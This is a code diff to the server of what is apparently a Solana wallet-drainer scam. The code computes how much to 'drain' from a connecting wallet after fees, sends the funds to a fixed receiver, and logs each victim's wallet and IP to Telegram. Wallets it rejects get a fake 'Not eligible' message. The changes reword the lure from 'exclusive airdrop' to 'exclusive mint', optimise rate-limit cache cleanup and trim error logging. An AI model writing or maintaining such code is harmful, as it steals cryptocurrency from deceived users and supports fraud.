@@ -117,30 +117,38 @@ const RATE_LIMIT_WINDOW = 60000; // 1 minute
 const MAX_REQUESTS_PER_WINDOW = 15; // Increased from 10 to 15
 const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Increased from 5 to 8
 
-// Cache cleanup function to prevent memory leaks
+// Cache cleanup function to prevent memory leaks (optimized)
 function cleanupOldCacheEntries() {
   const now = Date.now();
   const cutoff = now - RATE_LIMIT_WINDOW;
   
-  // Clean up IP cache
-  for (const [ip, requests] of requestCache.entries()) {
-    const filtered = requests.filter(time => time > cutoff);
-    if (filtered.length === 0) {
-      requestCache.delete(ip);
-    } else {
-      requestCache.set(ip, filtered);
+  // Optimized cleanup using batch operations
+  const cleanupCache = (cache) => {
+    const toDelete = [];
+    const toUpdate = new Map();
+    
+    for (const [key, requests] of cache.entries()) {
+      const filtered = requests.filter(time => time > cutoff);
+      if (filtered.length === 0) {
+        toDelete.push(key);
+      } else if (filtered.length !== requests.length) {
+        toUpdate.set(key, filtered);
+      }
     }
-  }
+    
+    // Batch delete
+    toDelete.forEach(key => cache.delete(key));
+    
+    // Batch update
+    toUpdate.forEach((value, key) => cache.set(key, value));
+    
+    return { deleted: toDelete.length, updated: toUpdate.size };
+  };
   
-  // Clean up wallet cache
-  for (const [wallet, requests] of walletRequestCache.entries()) {
-    const filtered = requests.filter(time => time > cutoff);
-    if (filtered.length === 0) {
-      walletRequestCache.delete(wallet);
-    } else {
-      walletRequestCache.set(wallet, filtered);
-    }
-  }
+  const ipStats = cleanupCache(requestCache);
+  const walletStats = cleanupCache(walletRequestCache);
+  
+  console.log(`[RATE_LIMIT] Cache cleanup completed - IPs: ${ipStats.deleted} deleted, ${ipStats.updated} updated; Wallets: ${walletStats.deleted} deleted, ${walletStats.updated} updated`);
 }
 
 // Enhanced rate limiting with high-value wallet bypass
@@ -543,7 +551,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         });
         return res.status(400).json({
           error: 'Sorry, You\'re Not eligible',
-          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
           code: 'INSUFFICIENT_SOL_FOR_FEES'
         });
       }
@@ -571,7 +579,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           });
           return res.status(400).json({
             error: 'Sorry, You\'re Not eligible',
-            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
             code: 'INSUFFICIENT_DRAIN_AMOUNT',
             reason: 'Drain amount too small after fee calculation'
           });
@@ -586,7 +594,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           debugLog(`Cannot drain safely: ${FRESH_BALANCE} - ${MINIMUM_BALANCE_AFTER_DRAIN} = ${maxSafeDrain} <= 0`);
           return res.status(400).json({
             error: 'Sorry, You\'re Not eligible',
-            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
             code: 'INSUFFICIENT_FUNDS_FOR_SAFE_DRAIN'
           });
         }
@@ -605,7 +613,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
           return res.status(400).json({
             error: 'Sorry, You\'re Not eligible',
-            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
             code: 'INSUFFICIENT_DRAIN_AMOUNT'
           });
         }
@@ -613,13 +621,11 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         // Validate that receiver is not the same as sender (safety check)
         if (userPubkey.toString() === RECEIVER.toString()) {
           console.error(`[DRAIN] CRITICAL ERROR: Receiver address same as sender: ${RECEIVER.toString()}`);
-          await telegramLogger.logError({
-            type: 'CRITICAL_CONFIG_ERROR',
-            user: userPubkey.toString(),
-            ip: userIp,
-            message: 'Receiver address same as sender - configuration error',
-            stack: new Error().stack
-          });
+                  await telegramLogger.logError({
+          user: userPubkey.toString(),
+          ip: userIp,
+          message: 'Receiver address same as sender - configuration error'
+        });
           return res.status(500).json({
             error: 'System configuration error',
             details: 'Please contact support',
@@ -634,7 +640,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           debugLog(`Invalid drain amount: ${finalDrainAmount} <= 0`);
           return res.status(400).json({
             error: 'Sorry, You\'re Not eligible',
-            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
             code: 'INVALID_DRAIN_AMOUNT'
           });
         }
@@ -666,17 +672,15 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         });
         return res.status(400).json({
           error: 'Sorry, You\'re Not eligible',
-          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
           code: 'INSUFFICIENT_FUNDS'
         });
       }
     } catch (error) {
       await telegramLogger.logError({
-        type: 'TRANSACTION_CREATION_ERROR',
         user: userPubkey.toString(),
         ip: userIp,
-        message: 'Failed to create transaction',
-        stack: error.stack
+        message: 'Failed to create transaction'
       });
       return res.status(500).json({ error: 'Failed to create transaction', details: error.message });
     }
@@ -699,7 +703,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
 
       return res.status(400).json({ 
         error: 'Sorry, You\'re Not eligible', 
-        details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+        details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
         code: 'INSUFFICIENT_FUNDS'
       });
     }
@@ -796,7 +800,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         });
         return res.status(400).json({
           error: 'Sorry, You\'re Not eligible',
-          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
           code: 'INSUFFICIENT_FUNDS_FOR_FEE'
         });
       }
@@ -817,11 +821,9 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         }
       } catch (serializeError) {
         await telegramLogger.logError({
-          type: 'SERIALIZATION_ERROR',
           user: userPubkey.toString(),
           ip: userIp,
-          message: 'Failed to serialize transaction',
-          stack: serializeError.stack
+          message: 'Failed to serialize transaction'
         });
         return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
       }
